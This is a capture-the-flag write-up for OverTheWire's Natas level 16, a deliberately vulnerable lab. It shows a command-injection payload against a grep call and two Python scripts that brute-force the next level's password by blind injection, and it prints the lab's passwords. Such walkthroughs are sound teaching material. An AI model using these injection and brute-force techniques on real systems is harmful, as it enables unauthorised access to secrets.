# Natas CTF Solutions  

## Natas Level 16  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Use **Command Injection** to extract the password from the system.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas16.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas16`  
- **Password:** Use the password from Natas Level 15:  
```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```  
![Home_Page](https://github.com/user-attachments/assets/6ea9797a-fdd6-4377-8ef3-94ace606d462)

---

### **Step 3: Analyze the Webpage**  
- The page has an **input box** where you can search for a keyword.  
- Viewing the **page source** reveals that the input is processed through a shell command:  
```bash
grep $input /etc/natas_webpass/natas17
```  
- This is vulnerable to **Command Injection** since user input is directly passed into the shell.  
![Source_Code](https://github.com/user-attachments/assets/b2de290e-b9cd-44f8-9771-343e78bb4e16)

---

### **Step 4: Test Command Injection**  
Try injecting the following command:  
```bash
joker$(grep a /etc/natas_webpass/natas17)
```
✅ If the character exists, the page output will NOT contain "jokers"  
✅ If the character does **not** exist, it will return the original search term  

---

### **Step 5: Automate Character Discovery**  
Use this Python script to automate the discovery of valid characters:  

```python
import requests, string

url = 'http://natas16.natas.labs.overthewire.org'
username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
charlist = []

characters = string.digits + string.ascii_letters

for char in characters:
    query = '/?needle=joker$(grep ' + char + ' /etc/natas_webpass/natas17)'
    r = requests.get(url + query, auth=(username, password))
    
    if 'jokers' not in r.text:
        charlist.append(char)
        print("Character Found: " + char)
        
print("Valid characters: " + ''.join(charlist))
```

✅ This script:  
- Tests each character using `grep`.  
- If the character is part of the password, `"jokers"` will **not** appear in the output.  
![Pass_Chars](https://github.com/user-attachments/assets/4b9a6614-34cf-4982-9f6e-a55acab14bba)

---

### **Step 6: Brute Force the Password**  
Use this Python script to brute-force the full password:  

```python
import requests

url = 'http://natas16.natas.labs.overthewire.org'
username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
secret = ''
passchar = ["0", "5", "7", "8", "9", "b", "h", "j", "k", "o", "q", "s", "v", "w", "C", "E", "F", "H", "J", "L", "N",
            "O", "T"]

for place in range(1, 33):
    for char in passchar:
        tmp = ''.join([secret, char])
        query = '/?needle=jokers$(grep ^' + tmp + ' /etc/natas_webpass/natas17)'
        uri = url + query
        r = requests.get(uri, auth=(username, password))
        
        if 'jokers' not in r.text:
            secret += char
            print(f"Password: {secret}")
            break

print("Final Password: " + secret)
```

✅ This script:  
- Builds the password character by character.  
- Uses `grep ^` to match the beginning of the string.  
- Stops once the correct character is found for each position.  

---

### **Step 7: Explanation**  
✅ The script sends a request with the `grep` command to test each possible character.  
✅ If the correct character is found, `"jokers"` will NOT appear in the output.  
✅ The script repeats the process until all characters are found.  

---

### **Step 8: Retrieve the Password**  
After running the script, the password for **Natas Level 17** is revealed:  
![Password](https://github.com/user-attachments/assets/e27e4b36-cd1e-4a02-b317-8be0c150fdf8)

---

### **✅ Password for Natas Level 17**  
```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```  

---

## 💡 **Lessons Learned**  
✔️ **Command Injection**: Use careful input sanitization to prevent shell execution vulnerabilities.  
✔️ **Brute Force Strategy**: If you know the pattern, you can reduce the search space and speed up the attack.  
✔️ **Automating Attacks**: Python makes it easier to automate complex attack patterns.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Page Source with Command Injection | ![Source_Code](https://github.com/user-attachments/assets/b2de290e-b9cd-44f8-9771-343e78bb4e16) |  
| Step 5 – Valid Characters Found | ![Pass_Chars](https://github.com/user-attachments/assets/4b9a6614-34cf-4982-9f6e-a55acab14bba) |  
| Step 8 – Found Password | ![Password](https://github.com/user-attachments/assets/e27e4b36-cd1e-4a02-b317-8be0c150fdf8) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 17**:  
👉 [http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org)  

---
